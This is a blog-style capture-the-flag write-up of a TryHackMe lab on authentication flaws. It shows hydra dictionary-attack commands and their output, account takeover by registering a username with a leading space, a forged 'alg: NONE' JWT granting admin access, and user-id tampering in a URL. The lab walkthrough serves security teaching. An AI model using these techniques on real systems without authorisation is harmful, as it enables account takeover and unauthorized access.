---
title: 'Exploiting Common Authentication Misconfigurations'
date: 2020-07-26 00:00:00
featured_image: '/images/posts/authenticate-icon.png'
excerpt: 'Authentication is the first entry into a system. What happens when developers misconfigure such authentication systems and open the door for unauthorized access.'
---
![](/images/posts/authenticate.png)

Authentication is one of the key components of a system. With the rise of internet usage and the number of applications, authentication became a key part of information technology space. But when the application developers misconfigure such systems, it opens the door for unauthorized access.

This post shows attacks on the authentication system and also how a misconfigure JWT based system can be exploited, by following the [TryHackMe](https://tryhackme.com/room/authenticate) provided vulnerable application.  


### Attacks on Authentication Systems
Common attack methods used to exploit the authentication systems and networks:

- **Brute force attack** - attempts to guess the credentials based on all possible character combinations.
- **Dictionary attack** - is based on a file of words and common passwords to guess the credentials.    
- **Pass the hash attack** - in a pass the hash attack, the attacker discovers the hash of the user's password and then uses it to log on to the system as the user.
- **Birthday attack** - in this the attacker will be able to create a password that produces the same hash as the user's actual password and is also known as a hash collision.  A hash collision occurs when a hashing algorithm creates the same hash for two different inputs (passwords).  
- **Rainbow table attack** - in this the attacker attempts to discover the password by comparing the actual password hash with a huge database of precomputed hashes, called the Rainbow table.  
- **Replay attack** - capturing the data in a session with the intent of later impersonating one of the parties in the session.  

### Example misconfigurations
Here are some example misconfigurations and we can see how these can be exploited.  
- **Lack of input sanitization**  When a developer ignores the sanitization of user input like username and passwords in the application code, then such application is vulnerable to attacks like SQL injections, buffer overflow attack, Cross-site scripting (CSS).  
- **JSON Web Token (JWT) misconfiguration**  A JSON web token, or JWT (“jot”) for short, is a standardized, optionally validated and/or encrypted container format that is used to securely transfer information between two parties. A misconfiguration can lead to exploit the authentication system.  
- **NoAuth** This type of vulnerability is very rare, but when it occurs, we can access other userspace just by changing the user id in the URL after login.   

## In Action
**Deploy the VM from [TryHackMe](https://tryhackme.com/room/authenticate) to exploit the authentication vulnerabilities.**    

### 1. Dictionary Attack
1. Access the web application on port 8888, which requests to provide user name and password.
1. The attack can be performed with Burp (from intruder with Sniper) or using `hydra`.  Lets use `hydra` for this demo.
1. But before that, we need to capture the http request that is being used for authentication.
1. Start Burp tool and capture the http request by posting some random credentials, like Jack:testpwd.
   Below is the http post request that was captured.
 ```
    POST /login HTTP/1.1
    Host: 10.10.237.94:8888
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://10.10.237.94:8888/
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 26
    DNT: 1
    Connection: close
    Upgrade-Insecure-Requests: 1

    user=jack&password=testpwd
 ```
1. Using `hydra`, lets perform the dictionary attack (with file rockyou.txt) to get the password for  users:
   jack and mike.    
 ```bash
    $ hydra -l jack -P /usr/share/wordlists/rockyou.txt 10.10.237.94 -s 8888 http-post-form "/login:user=^USER^&password=^PASS^:invalid_credentials"
    Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-26 14:47:40
    [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
    [DATA] attacking http-post-form://10.10.237.94:8888/login:user=^USER^&password=^PASS^:invalid_credentials
    [8888][http-post-form] host: 10.10.237.94   login: jack   password: 12345678
    1 of 1 target successfully completed, 1 valid password found
    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-07-26 14:47:57

    #mike
    $ hydra -l mike -P /usr/share/wordlists/rockyou.txt 10.10.237.94 -s 8888 http-post-form "/login:user=^USER^&password=^PASS^:invalid_credentials"
    Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-26 14:48:37
    [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
    [DATA] attacking http-post-form://10.10.237.94:8888/login:user=^USER^&password=^PASS^:invalid_credentials
    [8888][http-post-form] host: 10.10.237.94   login: mike   password: 12345
    1 of 1 target successfully completed, 1 valid password found
    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-07-26 14:48:44
```

1. From above we can see, the attack was successful and the passwords for the users are `12345678` and `12345` respectively.
1. Login with the above credentials and capture the user flags:  
 `fad9ddc1fe--------a05f02dd89e271` and `e1faaa144df--------9284f4a5bb578`.


### Re-registration due to lack of input sanitization  
In this attack, instead of performing dictionary based, we will use the application vulnerability where the input sanitization is not performing while registering for a new account. Lets exploit this by registering a new account that resembles to target user account, but with a leading white space in the user name field.

There is a user `darren`, but we don't have the password, so let's create a new account as `\ darren` (notice a leading white space).  
Post account creation, log in with the new user ` darren`, but the application logs into `darren` and capture the flag fe86079416a--------37fea8874b667.

![](/images/posts/authenticate-sample-account.png){:height="60%" width="60%"}

Repeat the same procedure for user `arthur`, by creating a new user account with user name as `\ arthur` and login to capture the flag d9ac0f7d--------ac3edeb75d75e16e.

### JSON Web Token  

A JWT contains three parts in the format [ Header ].[ Payload ].[ Signature ]  
Please refer to the article for more details on [JWT](https://medium.com/ag-grid/a-plain-english-introduction-to-json-web-tokens-jwt-what-it-is-and-what-it-isnt-8076ca679843).

1. Access the web application on port 5000 and authenticate with user:user
1. Capture the JWT token either from Burp or using a browser-->web developer tools-->Storage--> Local Storage.  

JWT Token:
`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1OTU3OTE2ODEsImlhdCI6MTU5NTc5MTM4MSwibmJmIjoxNTk1NzkxMzgxLCJpZGVudGl0eSI6MX0.bAPHetpdduqoY3_o2og5Et7W2Ies9VL3AKMntD1_2yA`  

Complete Post request:
```
GET /protected HTTP/1.1
Host: 10.10.237.94:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.237.94:5000/
Content-Type: application/json
Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1OTU3OTE2ODEsImlhdCI6MTU5NTc5MTM4MSwibmJmIjoxNTk1NzkxMzgxLCJpZGVudGl0eSI6MX0.bAPHetpdduqoY3_o2og5Et7W2Ies9VL3AKMntD1_2yA
DNT: 1
Connection: close
```

1. The first two parts of a JWT token can be decoded using base64 decoder or from this [JWT debugger](https://jwt.io/#debugger-io).  
![](/images/posts/jwt-debugger.png){:height="100%" width="100%"}
1. From the header decoded information, we can see, the algorithm using is `HS256` and in the payload, the identity is 1, which could be user ids.
1. Let us exploit the misconfigured application, where the authentication system is not validating the tokens properly.  
1. Modify the token by making the algorithm to NONE, identity as 0 (assuming 0 is the admin account) and the third part is not required as the algorithm is NONE.
1. Encode first two parts with base64 [encoder](https://www.base64encode.org):   
`{"typ":"JWT","alg":"NONE"}` --> `eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0=`
`{"exp": 1595791681, "iat": 1595791381,"nbf": 1595791381, "identity": 0}` --> `eyJleHAiOiAxNTk1NzkxNjgxLCAiaWF0IjogMTU5NTc5MTM4MSwibmJmIjogMTU5NTc5MTM4MSwgImlkZW50aXR5IjogMH0=`
1. The new JWT token for admin is now ready, `eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0=.eyJleHAiOiAxNTk1NzkxNjgxLCAiaWF0IjogMTU5NTc5MTM4MSwibmJmIjogMTU5NTc5MTM4MSwgImlkZW50aXR5IjogMH0=.` and replace this in the browser session and click GO.
1. We now logged into the application with the `admin` user as shown in the below image.  

![](/images/posts/JWT-admin-login.png){:height="60%" width="60%"}

### No Auth
As mentioned earlier, this type of vulnerability is very rare in today's application but exists when designed the application poorly.  

1. Access the application on port 7777.
2. Create a new account and login.  
3. Visit private space and you can notice the url `http://10.10.237.94:7777/users/1`
4. Change the user id 1 with 0, which access the superadmin's private space.  

### Conclusion
The Authentication and Authorization system are very critical in information technology space, a misconfigured system will open the door for attackers. Implementing the policies like Account lockouts, password complexities, salting the passwords, multi factor authentication, using strong hash algorithms for storing the credentials and performing the input sanitization when allowing users to input the data can help in avoiding the exploitation of authentication systems.  

###### References:  
1. Image and exploitable VM credits: [TryHackMe](https://tryhackme.com/room/authenticate)  
1. Gibson, D. (2014). Protecting Against Advanced Attacks. In CompTIA Security+ get certified get ahead SYO-401 study guide. YCDA, LLC.  
1. Koretskyi, M. (2018, June 26). A plain English introduction to JSON web tokens (JWT): what it is and what it isn't. Medium. https://medium.com/ag-grid/a-plain-english-introduction-to-json-web-tokens-jwt-what-it-is-and-what-it-isnt-8076ca679843.  
